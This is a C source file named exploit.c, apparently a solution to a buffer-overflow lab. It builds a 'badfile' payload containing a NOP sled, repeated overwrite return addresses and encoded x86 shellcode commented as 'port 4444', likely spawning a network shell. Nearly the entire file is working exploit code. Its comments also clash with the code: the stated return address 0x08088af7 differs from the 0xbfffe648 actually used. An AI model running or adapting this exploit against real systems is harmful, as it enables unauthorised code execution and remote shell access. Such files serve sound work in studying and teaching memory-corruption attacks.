/* exploit.c  */

/* A program that creates a file containing code for launching shell  \x08\xf7\x8a\x04*/
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

//port 4444
char shellcode[] = "\xda\xc2\xd9\x74\x24\xf4\x5d\xbe\xbe\xc6\xdd\x4e\x2b\xc9\xb1\x12\x83\xc5\x04\x31\x75\x13\x03\xcb\xd5\x3f\xbb\x02\x01\x48\xa7\x37\xf6\xe4\x42\xb5\x71\xeb\x23\xdf\x4c\x6c\xd0\x46\xff\x52\x1a\xf8\xb6\xd5\x5d\x90\x37\x26\x9e\x61\xa0\x24\x9e\x70\x6c\xa0\x7f\xc2\xea\xe2\x2e\x71\x40\x01\x58\x94\x6b\x86\x08\x3e\x1a\xa8\xdf\xd6\x8a\x99\x30\x44\x22\x6f\xad\xda\xe7\xe6\xd3\x6a\x0c\x34\x93";

void main(int argc, char **argv)
{
    char buffer[528], *ptr;
    int i = 0;	
    int size = 528;
    int shell_size = 95;	
    
    FILE *badfile;

    /* Initialize buffer with 0x90 (NOP instruction) */
    memset(&buffer, 0x90, 528);

    /* You need to fill the buffer with appropriate contents here */
   		

		
	/*return address is 0x08088af7, however it is split into high and low addresses so must be written as 8af70804 to be loaded into memory properly*/	
	
	long addr = 0xbfffe648;
	

	for (i = 32 ; i < size/3; i+=4){
	long *ptr2 = (long *) (buffer + i);	
	*ptr2 = addr;	
	}
	
	
	/*adding the shellcode into the buffer*/	
	ptr = buffer + size/3;
	for(i=0; i < strlen(shellcode); i++){
	*(ptr++) = shellcode[i];
	}

	
	buffer[size-1] = 0;
	     
    /* Save the contents to the file "badfile" */
    badfile = fopen("./badfile", "w");
    fwrite(buffer, 528, 1, badfile);
    fclose(badfile);
}
